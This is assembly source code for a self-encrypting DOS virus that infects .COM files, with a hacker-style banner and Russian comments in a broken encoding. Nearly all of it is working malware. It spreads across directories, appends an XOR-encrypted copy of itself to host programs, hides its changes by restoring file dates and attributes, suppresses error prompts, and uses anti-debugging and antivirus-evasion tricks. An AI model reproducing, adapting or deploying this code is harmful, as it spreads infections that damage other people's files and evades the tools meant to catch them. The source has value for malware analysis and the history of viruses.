
;            ���
;           �����  �����  ������  � Let's add some infection to this �
;          ������   ��� ����   ��            fuckin' world
;         �۲� ��   �۱ �۲          ��������-�����-����-���-��-�--� �  �
; ���    �۲� �����۲�� ۲�
; ����  �۲�  ����  ޲� �۱          [ MiF ] v.2.7 BugFix (cl) by SST
;  ����ܲ��   ���   �۲  ����  ���
;   ����۲    ����  ����  �������

; ���⥭쪨� ��஢���� (with random key) ��१������ �����
; ��� DOS. ������� *.com (��⮤ dot-dot), �����뢠� � ��砫�
; ����� jmp �� ᥡ�, � ᥡ� - � �����.. ����� ;) �ᯮ����
; ᫥���騥 ��⮤� ��᪨஢��: �� ����� ��ਡ�⮢, �६��� �
; ���� ᮧ����� (��᫥���� ����䨪�樨) 䠩���, �⠢�� '������'
; �� int 24h.

; ����� ��� �祭� ��稭���� (��� ��直� �ਡ����ᮢ � � ��ࠬ� ��譨� ����)

;  �------------------- Source Of MiF Virus v.2.7 -------------------�

.model tiny                     ; ��� ᮧ����� 䠩��� com-�ଠ�
.286                            ; �ᯮ��㥬 ������樨 286 ������
.code                           ; 㪠�뢠�� �� �, �� ��砫��� �����
org 100h
start:                                
        db 090h,0e9h,0h,0h      ; ����� (jmp) �� ��� ����� + NOP ���
                                ; �஢�ન �� ��ࠦ�������
real_start:
        pusha                   ; ���࠭塞 ᮤ�ন��� ॣ���஢
        pushf
        push ss
        push es
        push ds

        xor ax,ax               ; AntiDebuger
        mov es,ax
        mov es:[0004],ax

antiheur:
        in al,40h               ; ��६ �� ���� ⠩��� ��砩�� ����,
        mov ah,al               ; ����ᨬ � ah, �� ࠧ � १���� � al
        in al,40h               ; �ࠢ������ al � al, �᫨ ࠢ��, �
        cmp ah,al               ; ���� �����, �� ࠢ��? ⮣�� ᭮�� ��
        jne antiheur            ; ���� 'antiheur'. ������� �� ����� ��������
                                ; �㦭� ����� (���� �� ��������!) � ��म
                                ; ����� 'Ok' ;) (�� �� av �� �� ���㯠���� ;(

        call del_ofs            ; ������� delta offset
del_ofs:                        
        mov di,sp
        mov di,[di]
        add sp,2
        sub di,(del_ofs - start) + 100h
        xchg di,bp

        call crypt              ; ��뢠�� ��楤��� ����஢��
                                ; ��襣� ����

        jmp next_step           ; ��९�루���� ��楤��� �ࠧ�
                                ; �� ����஢���� ��� ����
crypt:
        lea di,[bp+next_step]
        mov cx,(end_vir - next_step + 1) / 2    ; ����� ���㥬��� ���� �����
        mov dx,[bp+crypt_key]                   ; � dx ���� ��� ��஢��
again:
        xor word ptr [di],dx    ; ���㥬 ��WORD��
        fild number1            ; �१ ᮯ�����
        fild number2
        fadd
        fistp oki
        add di,[bp+oki]
        loop again
        ret

        number1 dw 1
        number2 dw 1
        oki dw ?

        crypt_key dw 0          ; ���� ��� ��஢�� �����

crypt_virus:
        call crypt              ; ����஢���

        lea dx,[bp+real_start]  ; ����ᠫ� ����஢����
        mov cx,len              ; ��᮪ � 䠩�
        mov ah,40h
        int 21h
        call crypt              ; ����஢���
        ret

next_step:
        jmp after_proc          ; ��९�루���� ��楤���

int24h:
        mov al,3
        iret

set_lseek:
        mov ah,42h
        xor cx,cx
        cwd                    ; ���� � � ��, �� � xor dx,dx,
        int 21h                ; �� ⮫쪮 �᫨ ax <= 8000h !
        ret

after_proc:

        mov ax,3524h           ; �������� ����ࠢ�� int 24h
        int 21h

        mov ax,2524h
        lea dx,[bp+int24h]
        int 21h

        push cs
        pop  es

        mov ah,47h             ; ��࠭塞 ���� ����
        xor dl,dl              ; ⥪�騩 ���
        lea si,[bp+path_buffer]
        int 21h

        mov ah,1ah             ; ��⠭�������� DTA
        lea dx,[bp+dta]
        int 21h

        lea di,[bp+orig_bytes] ; ��࠭塞 ���� ���� ���� �ண�
        mov si,100h

        xchg si,di
        
        mov cx,4
        rep movsb

start2:
        mov ah,4eh
        lea dx,[bp+filespec]
        mov cx,7               ; �� ��ਡ���

file:
        int 21h
        jnc infect             ; 䠩� ������ - �����㥬 ���
        jmp prev               ; ���? �饬 � �।��饬 ��⠫���

prev:
        mov ah,3bh             ; ��३� � �।��騩 ��⠫��
        lea dx,[bp+pdir]
        int 21h
        jnc start2
        jmp exit

infect:
        mov ax,4300h
        lea dx,[bp+dta+1eh]
        int 21h

        mov [bp+attribs],cx     ; ��࠭��� ��ਡ���

        xor cx,cx               ; ���� �� ��ਡ���

        mov ax,4301h
        lea dx,[bp+dta+1eh]
        int 21h

; ��ன ᠬ 㤨�������, ��� �� ����� �������� ��⨢����� ;)
; ��� ��直� �����祭��� �ਥ���, ���� ��頥� ॣ���� ax,
; ����ᨬ � ah=3dh (�㭪�� ������ 䠩�� ��� ������ � ⮫쪮),
; � ��⮬ �����ࠥ� �� ���� ⠩��� (��� �� �������!) 02h �
; ॣ���� al. � ax ����砥� 3d02h, �� ����� ��㤭� ��������
; १������ ��⨢����� �����ࠬ � ��祩 ����� ;) ⠪
; ����室���� 02h � al � '�㤮-�ணࠬ��' ����� �� ॠ������
; �� ����� ����, ���� �� �� '������' �� ���� ���뢠�� 䠩�
; ��� ������, �� ����� => 8-)  (�� ࠡ�⠥� �� NOD32 :(

        xor ax,ax               ; ������ ॣ���� ax

        mov ah,3dh              ; ������ 䠩� ��� �⥭�� (� ��!)

obman:
        in al,40h               ; �����ઠ 02h ��� ॣ���� al ��
        cmp al,02h              ; ���� ⠩���
        jne obman


        lea dx,[bp+dta+1eh]     ; � dx - ��� ��������� 䠩��
                                ; ������ �� DTA
        int 21h

        jnc all_ok              ; ��� �訡��? ⮣�� �� 'all_ok'

        jmp find_next           ; �訡��? �饬 ᫥���騩

; �� � ����� �� ��� �� ���� :))

all_ok:

        xchg bx,ax              ; ����� ��������� 䠩��

        mov ah,3fh              ; ������ ���� �� ����
        mov cx,4
        lea dx,[bp+orig_bytes]
        int 21h

        jc close                ; ���� �訡��? ⮣�� - ᫥���饩


        cmp word ptr [bp+orig_bytes],0E990h
;//  ���쪮 �� NOP �� ४������� �஢����� - ⠪�� ⮦� ����砥���..

        je close

        cmp [bp+orig_bytes],'M' ; �� EXE (MZ) ��२��������� � com?
        je close                ; ��? - �� close
        cmp [bp+orig_bytes],'Z' ; EXE (ZM)?
        je close                ; ��? - �� close

        mov al,02h
        call set_lseek

        jc close

        or dx,dx
        jnz close

        cmp ax,end_vir - start  ; 䠩� ࠢ�� ࠧ���� ����?
        jna close               ; ��? - �� close

        cmp ax,65000d           ; 䠩� => 65000 ����?
        jnb close               ; ��? - �� close

        in al,40h               ; ����� �� �� ���� ⠩���
        mov ah,al               ; ��६ ��砩�� �᫠ ;)
        in al,40h
        mov [bp+crypt_key],ax   ; ��࠭塞 ���� (ax) � 'crypt_key'

        mov ax,5700h            ; ��࠭塞 �६� � ���� ��᫥����
        int 21h                 ; ����䨪�樨 䠩��
        mov [bp+time],cx
        mov [bp+date],dx


        mov al,02h
        call set_lseek          ; � ����� �����

        jc close

        mov cx,word ptr [bp+dta+1ah]       ; ࠧ��� 䠩��

        sub cx,3                           ; ����� �� ���� (��� jmp'�)
        mov word ptr [bp+first_bytes+2],cx

        call crypt_virus        ; ����襬 � ����� 䠩��
                                ; ����஢���� ����

        jc close                ; ���� �訡��? ⮣�� - ᫥���騩

        xor al,al               ; al=00h
        call set_lseek          ; � ��砫� 䠩��

        jc close

        mov ah,40h              ; ��襬 jmp �� ���� � ��砫� 䠩��
        lea dx,[bp+first_bytes]
        mov cx,4
        int 21h

        jc close                ; ���� �訡��? ⮣�� - ᫥���騩


        mov ax,5701h
        mov cx,[bp+time]
        mov dx,[bp+date]
        int 21h

close:
        mov ah,3eh              ; ������� 䠩�
        int 21h


find_next:

        mov cx,[bp+attribs]
        lea dx,[bp+dta+1eh]
        mov ax,4301h
        int 21h

        mov ah,4fh              ; �饬 ᫥������ �����
        jmp file

exit:
        mov ah,1ah              ; DTA, 80h (�⠭���⭮)
        mov dx,80h
        int 21h

; ����⠭����� �ਣ������ int 24h

        mov ax,2524h
        int 21h

        pop ds
        pop es

; int 24h ����⠭�����


        mov ah,3bh              ; ����⠭����� ���� ����
        lea dx,[bp+path_buffer]
        int 21h

        pop ax
        mov es:[0004],ax

        push 100h               ; ��।��� �ࠢ����� ��ࠦ�����
        pop di                  ; �ணࠬ�� (��ᢥ��� jmp �� 100h)
        jmp di

        pop ds
        pop es
        pop ss
        popf
        popa

        ret

; �����, �㦭� ������

pdir db '..',0
filespec db '*.com',0
first_bytes db 90h,0E9h,0h,0h
orig_bytes db 0cdh,20h,90h,90h
virname db '[ MiF ]',0

len equ $ - real_start

end_vir:

; ����

path_buffer db 64 dup (?)
dta db 42 dup (?)
attribs dw ?
time dw ?
date dw ?

end start

;  �------------------- Source Of MiF Virus v.2.7 -------------------�